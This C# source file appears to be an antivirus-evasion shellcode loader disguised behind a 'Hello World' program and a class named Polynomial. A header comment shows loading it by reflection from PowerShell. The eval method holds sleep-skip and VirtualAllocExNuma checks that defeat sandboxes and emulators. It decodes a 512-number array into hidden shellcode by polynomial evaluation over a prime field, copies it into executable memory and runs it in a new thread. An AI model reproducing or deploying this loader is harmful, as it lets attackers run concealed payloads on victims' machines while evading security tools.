/*
 * $bytes = [System.IO.File]::ReadAllBytes("C:\shellcode.exe")
 * [Reflection.Assembly]::Load($bytes)
 * [Polynomial]::eval()
*/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Numerics;

public class Program
{
    public static void Main(string[] args)
    {
        Console.WriteLine("Hello World");
    }
}

public class Polynomial
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
        
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    
    public static void eval()
    {

        // Root of unity assuming Goldilocks prime field and 512 length shellcode
        BigInteger field_modulus = 18446744069414584321;
        BigInteger root_of_unity = 4545880015766881148;

        // Exit if "time skip" is satisfied.
        DateTime t1 = DateTime.Now;
        Sleep(4000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

        if(t2 < 3.5)
        {
            return;
        }

        // Exit if VirtualAllocExNuma is not recognized by heuristic.
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
            return;
        }

        BigInteger[] poly = new BigInteger[512] {8430738500474634352, 15406082931239932800, 2127612261543577583, 3924810695380759204, 6257623225220038193, 12171878530033743853, 10393455695235911353, 3482011111624307229, 6437538963579614490, 7698963509545888751, 11422143785376565372, 8038237369411624958, 18232824516960624340, 4934387150740261823, 2983895244341892042, 888897032540904600, 18210996261565494580, 833708792610684967, 12036596321751681313, 15576444414069656651, 3173407141474623903, 14239246739604738607, 9672694572885311460, 7473620883001580033, 14884059855876030177, 13554040213366920760, 10990683918749899382, 13156931844501023914, 15557365388875728416, 13408751342717785425, 15561592309579668514, 531500477768877613, 3342823296792842416, 3674892501130164852, 8797728812069561838, 8850775588945308704, 12398172199701795264, 1974939604970709168, 1627475468473489766, 15882406244976332124, 8918851406243116559, 13848016199748231335, 14515239808480344512, 3367240765875889981, 16748221912995396852, 17010412305111437558, 18407502796061190033, 9654286399860186455, 6956036293874943634, 17089799574625856421, 9033979544634366651, 3060295609617370082, 5067192308980989304, 5367697149814833794, 15756771238306132388, 14009674163345312216, 4828929357368502463, 14840043088009485611, 10157551376961669556, 18136057291926670435, 17809276664090459649, 4639410196686733995, 4331122348761324667, 6391517690985449553, 793083466454270155, 4479079466510568366, 11313934727580999347, 2557941264119401499, 9130638652959123152, 535405526967796400, 17566955313108413622, 10088153872223325889, 3268791984776918992, 3686385795618971993, 3066546204922416093, 15116887567220962816, 16016601931676794260, 13557009455236413184, 9233675870415021887, 16354155544688173804, 2376033224785985912, 11871673430881305539, 10699357716338520917, 14972571300207312972, 15569510201116573864, 10132676793738966920, 11201769584818564874, 2319908355452504801, 14889592783699583266, 7767478054917459362, 14331001367037856196, 11141298455332950447, 7798412169739886885, 16187003946854115937, 229302159225977839, 8942834455579403389, 5603393056692099876, 10461922956479614346, 3436914144296986476, 5991933626427277313, 7392008411876220158, 5140751279054699704, 11959661527773746690, 17004688665108900621, 4421512155280051350, 15194023929654731575, 2130034786802662962, 15199760692987478347, 13146606140597764073, 7702916371253363577, 639858757950077407, 6714976763134032675, 9346608024264014262, 14066325071382846756, 17474790538974444346, 1837854533149619784, 788279532333524386, 8773932300021194433, 9006930821773107026, 17441804209950100056, 12053334285013322920, 1325849861117225781, 17803911221743991337, 1941448278676197633, 15431633862482669910, 6617784128512609323, 9151335261796617579, 6097934365087798727, 3025826312120958976, 12394548180898712046, 15038887840628732163, 1625484837554722495, 17803975888810681310, 9480098839610781417, 11686522761788464705, 17810962937751689567, 15485497128251064572, 17037781895057019219, 262900316811302821, 7449826318366614093, 6281501883401286710, 11973341056550750105, 7457983576574212143, 7969583019968372244, 12297179317717230550, 6520718363667640, 16539670989613646842, 5328170624234354176, 6316822510640816158, 4514386148450932370, 2940030701655306820, 13398319900065537323, 8705789167512385165, 2004010071042725991, 10967178395896135366, 6806107817881137302, 12101053247740731253, 15561099655898130183, 13252071642814229759, 13046969510921771167, 4668217369858023870, 381387603915570202, 17237723740739453523, 1980467791378272973, 16554928248542402286, 7971877500348754162, 11067577054645111157, 10373114229154734001, 9053640056311066089, 11333629984040278272, 15327619564694381383, 1349797574987627070, 2076082886222049375, 11293405076178393525, 3887810284294711552, 3773847622509904586, 4277350755430740901, 13762696023393959516, 12012797891192809721, 11061861348556035178, 13427639495104891749, 8733157092810516214, 7330245434467754159, 7466909009134131292, 16728038678060292098, 5864140078403760752, 3653262838632274453, 2399793235412744890, 5374007657133293208, 5537762807050554975, 7074589975239215268, 1576147376673351570, 792185199763258819, 8519190229521886096, 2681501192131622857, 9458801186996402599, 14059737990436560366, 2317882491823913764, 9919956753281761054, 12599670252225869800, 17838954910418343533, 5422947689749417078, 1983535531349946390, 10395015895584883551, 14073575754772260854, 5131984945884833211, 14583253952022454991, 4964798888844032289, 2986352534517861008, 17993873674222675383, 2682519964919903365, 11405541146413892387, 10451814670537990706, 10139078871733577300, 16474637915283889896, 15784104430765337105, 11461348744841616508, 3890720618204443822, 9900032612367168815, 14422822420836874211, 15154679639301694419, 13893820444197961167, 372871159181732760, 6355690622025012395, 4364938719596627450, 6171388774760534638, 16041578788828730135, 17531059296454315318, 13178078472335466399, 6325882722817200363, 1410076327043001849, 9217267284484548613, 14738869878792593681, 3669126041845840058, 143571102490874444, 10590854349465382973, 12266523825191820214, 12513626790194797146, 9594555928526445027, 17483529984007974093, 10020730508125041927, 15256199965919660937, 11252499735860243540, 7831918161741581501, 15861492001981498749, 12824240916296769427, 2102274050415918902, 13824743782119023802, 6083881053981354415, 6759833082495760160, 5123668203106037237, 16256421054141907200, 10928616456197648703, 8403544885798492683, 4864518427835714224, 7490862603688755680, 7998392936347729919, 17354535300623387421, 17576538567804808490, 10252761205273176636, 16369928722251051579, 10848263083952115792, 13430578214622762534, 1888773461064392176, 12920291578584555628, 4941755380924888795, 1336959299390826528, 7441095948864590828, 1513919916493986165, 13180522278180647413, 7402752434988681189, 9123411337808837038, 1715327355205204213, 13365022583270920607, 7997328340962641674, 12714273659948503154, 3798414654221538958, 4863746988978772921, 7693193931058899269, 6913076579429950109, 5581100628830090350, 17976748727260191575, 13648510571181963810, 17933155700560227007, 1988576657450398022, 16107206881757675325, 2294381516504925701, 16398185276558551624, 5807312664989871648, 1857589689146537832, 2170696395066175003, 1847531320892537533, 16108291205783623216, 4090487253845950243, 1982482453246402935, 6965037339131787923, 13296799295813194276, 5661005600350179584, 1558337348997646804, 9750895616979631962, 1743572644833425307, 4423511180270259163, 14689725884757609220, 8190040955974795159, 12486240979776655600, 10041633909232705174, 5742586408839853438, 9392709736599715346, 8965730795386418138, 12158809822553069819, 7995633055948538367, 2941637278649846468, 4090913459497344603, 18382399675162925207, 16297308002851079033, 11373803118807156803, 11286283438120318906, 9766698745870625833, 8613435688315661543, 13724201436664009157, 793085201545822007, 9914437855982686546, 3083723040086686580, 5651300804464270807, 9432255747718257735, 5878296017574402045, 4188165243367086142, 4422840032292253875, 2957219563800268307, 14496290607395860658, 11833506960750329202, 14784357194625799292, 7764498317518670202, 3705855390844113215, 3003867003889774275, 2066404621937902547, 17410329899753033379, 5880717940687947779, 15868864094830051430, 16618893238369932475, 12161003698120085839, 16590745697420928772, 18298248365327519348, 8072230481184232660, 3265309469826090434, 9101105211714949546, 2312713636144485054, 9159690197821518386, 6831094827806032110, 9642200219403342376, 41898748678557755, 9117643411973391360, 3549100704723903812, 12995160190657976495, 11922811354636457990, 1094530841899184833, 5380214766788622976, 18209512499869323693, 2624823404313721424, 4960783812507943850, 5894739249845261014, 15262447355543927233, 11048196800674586382, 7131607221702164574, 9817659143949055687, 1754541987398304062, 4017305156406834536, 16863579077877072726, 12517270774480358732, 9597805232509914556, 3466053795701309177, 17828307552394202538, 10447495131062004060, 17021739865815499049, 11867096853272102853, 6947863180175274670, 10478281378719181486, 7185474150953550067, 12223768272827609705, 873120179532253850, 3733010458534209579, 6020949363254798572, 10258915373861092651, 6434545513866461108, 3027011585655701504, 11038094881728368255, 5371073381007637326, 1177326902538586249, 2037836971355377167, 1690818072450114358, 2906804894373276228, 17591843120566973694, 13451864113934964213, 7255936191459574668, 1781876447972973201, 3224516206955331601, 1829701818737250295, 12086780480401898413, 17592262261304291738, 4779303011733959387, 5535040485662847187, 9597128512364959407, 67878189613911514, 3903522392246390348, 2581574334922469290, 6558596062061972766, 8935876738798113545, 16194716941169402527, 47289240870358908, 7605395394891458664, 15180291445127060794, 8196879663580528853, 16203175554432404905, 12697314079584861470, 9072282762988860461, 186114691601104476, 4481915997778337646, 1748496666254304824, 16396247045669360238, 1360489303219082584, 1374277338216834988, 9341583137860778081, 14257389382458233876, 6483153025842992667, 1714042316342487218, 10378261606398091766, 312115054572283303, 10160525807442052156, 4564741822896407665, 2236472805448074376, 6057562983905991442, 13236289458370296437, 14038182076924556957, 1128491216763711889, 10166882730061882845, 681743203781205248, 14709033373632008801, 2934307471281302991, 7054575610090249672, 14510015631214135905, 4134425558025052080, 7175685473394084555, 9867926497071461109, 13453129776131887079, 10081225869214978643, 8688016986455432681, 15846646840585286585, 16577076863331905110, 792180269167280703, 16536397154376305660, 1628294093865975940, 16854973476350192590, 10456648278100441262, 674726619341759954, 13700369091841937231, 10842739448084181131, 9785281615535468774, 12201596675861154111, 1238618809795594539, 8665837614141328748, 1139701516797345357, 7436878506670428922, 161080234138864932, 2810881671152663414, 14985833928725652107, 6520581296494328585, 6228115597342089079, 8574848463243392593, 13371784475740359853, 13298230198165644763, 1505350151957275778, 14168428758281462891, 4864655031322410104, 4165076586536460401, 489609616127158508, 15288621658581648667, 7283073792635735398, 228672826800834754, 238002133707327537, 2426484722128964051, 4787555952312859034, 18263204170047377623, 12852675631254817418, 9069176993321128057, 5207065932949579493, 165318541940433614, 17444720227374122788, 17900247869330218980, 5660227480555955985, 13383945711515222531, 8676918739491591783, 15114250550593114880, 17472633303324758787, 4047844383712680711, 2297605280507897147, 3717821358111070041, 5873204647522288187, 913885439895610529, 5045679955777213806, 18209212220985398674, 8003744757634618169, 9714890743143387823, 9994075492551368918, 9475607325832490411, 5301326136694990599, 13628214405326266719, 17514512583223093737, 16834974256616876814, 5573609160650178154, 11407642009079728361, 15442537792137767470, 1036642869938755306};
        byte[] fin = new byte[512];
        
        int size = poly.Length;

        // No FFT = no multipoint eval = O(n^2). Don't want to make a sloppy BigInteger NTT and did not immediately find some prime field library in C#.
        BigInteger omega = 1;
        BigInteger inner_omega = 1;
        for (int i = 0; i < size; i++) {
            BigInteger result = poly[0];
            inner_omega = omega;
            for (int j = 1; j < size; j++) {
                result = (result + ((inner_omega * poly[j]) % field_modulus)) % field_modulus;
                inner_omega = (inner_omega * omega) % field_modulus;
            }
            omega = (omega * root_of_unity) % field_modulus;
            fin[i] = (byte)result;
        }

        IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
        Marshal.Copy(fin, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
